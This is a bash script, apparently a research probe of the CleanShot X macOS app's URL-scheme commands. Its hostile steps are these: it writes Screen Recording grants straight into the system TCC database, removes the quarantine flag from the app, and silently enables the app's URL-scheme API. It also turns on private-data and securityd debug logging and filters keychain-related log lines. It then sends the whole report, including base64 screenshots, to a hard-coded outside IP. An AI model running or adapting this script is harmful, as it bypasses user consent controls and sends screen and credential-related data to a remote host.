#!/bin/bash
# CleanShot X probe v12 — see what the app actually shows after a URL command.
# Grants Screen Recording to screencapture (if SIP off), screenshots the app, ships base64 back.
OUT=/tmp/csx-report-v12.txt
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1
set -x
set +e

DROP_URL="http://143.246.43.43:8080/csx-v12"
DOMAIN="pl.maketheweb.cleanshotx"
SUITE="AFJU4P8ZV4.pl.maketheweb.cleanshotx"
TARGET="/Applications/CleanShot X.app"

finish() {
  echo "=== EXIT $? ==="
  curl -s --max-time 90 -X POST --data-binary @/tmp/csx-report-v12.txt "$DROP_URL" || true
}
trap finish EXIT

sw_vers; id; sudo -n true && echo SUDO_OK || echo SUDO_NO
echo "=== SIP ==="
csrutil status 2>&1

sudo log config --mode "private_data:on" 2>&1
sudo log config --subsystem com.apple.securityd --mode "level:debug,private_data:on" 2>&1

echo "=== TCC GRANT (if SIP off) ==="
TCCDB="/Library/Application Support/com.apple.TCC/TCC.db"
if [ -f "$TCCDB" ]; then
  sudo sqlite3 "$TCCDB" "select service,client,auth_value from access where service like '%ScreenCapture%';" 2>&1 | head
  for C in /usr/sbin/screencapture /bin/bash; do
    sudo sqlite3 "$TCCDB" "insert or replace into access (service,client,client_type,auth_value,auth_reason,auth_version,indirect_object_identifier_type,indirect_object_identifier,flags,last_modified) values ('kTCCServiceScreenCapture','$C',1,2,4,1,0,'UNUSED',0,strftime('%s','now'));" 2>&1
  done
  sudo sqlite3 "$TCCDB" "select service,client,auth_value from access where service like '%ScreenCapture%';" 2>&1 | head
else
  echo "no TCC db"
fi
sudo killall tccd 2>/dev/null

DMG=/tmp/csx.dmg
curl -sSL --max-time 300 -o "$DMG" https://updates.getcleanshot.com/v3/CleanShot-X-5.0.2.dmg
hdiutil attach "$DMG" -nobrowse -noverify -readonly
MP=$(hdiutil info | awk -F'\t' '/\/Volumes\//{print $NF}' | tail -1)
sudo rm -rf "$TARGET"; sudo ditto "$MP/CleanShot X.app" "$TARGET"
sudo xattr -dr com.apple.quarantine "$TARGET" 2>&1
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f "$TARGET"
sleep 2

for D in "$DOMAIN" "$SUITE"; do
  defaults write "$D" allowURLSchemesAPI -bool true
  defaults write "$D" didAskAboutURLSchemesAPI -bool true
  defaults write "$D" _allowURLSchemes -bool true
done

open -a "$TARGET"
sleep 14
PID=$(pgrep -f "CleanShot X.app/Contents/MacOS" | head -1)
echo "PID=$PID"

python3 - <<'PY'
import struct,zlib
def png(path,color,w=64,h=64):
    raw=b''.join(b'\x00'+bytes(color)*w for _ in range(h))
    def ch(t,d):
        c=t+d
        return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xffffffff)
    open(path,'wb').write(b'\x89PNG\r\n\x1a\n'+ch(b'IHDR',struct.pack('>IIBBBBB',w,h,8,2,0,0,0))+ch(b'IDAT',zlib.compress(raw))+ch(b'IEND',b''))
png('/tmp/csx_canary.png',(255,0,0))
PY
chmod 644 /tmp/csx_canary.png

echo "=== SHOT 0: after launch ==="
sudo screencapture -x /tmp/shot0.png 2>&1; ls -l /tmp/shot0.png

echo "=== STREAM START ==="
sudo log stream --level debug --style compact --predicate 'process == "CleanShot X" OR subsystem CONTAINS "securityd"' > /tmp/stream.txt 2>&1 &
SP=$!
sleep 2

echo "=== CMD pin ==="
open -a "$TARGET" "cleanshot://pin?filepath=/tmp/csx_canary.png"
sleep 6
sudo screencapture -x /tmp/shot1.png 2>&1; ls -l /tmp/shot1.png

echo "=== CMD upload ==="
open -a "$TARGET" "cleanshot://upload?filepath=/tmp/csx_canary.png"
sleep 5
sudo screencapture -x /tmp/shot2.png 2>&1

sleep 2
sudo kill $SP 2>/dev/null

echo "=== STREAM SecItem ==="
grep -iE "SecItem|keychain|query|service=|account=" /tmp/stream.txt | head -60

echo "=== STREAM app ==="
grep -i "CleanShot X\[" /tmp/stream.txt | head -50

echo "=== SHOTS ==="
for f in /tmp/shot0.png /tmp/shot1.png /tmp/shot2.png; do
  echo "--- $f"
  ls -l $f 2>&1
  base64 -i $f 2>/dev/null | head -c 400000
  echo
  echo "--- END $f"
done

echo "=== DONE ==="
exit 0
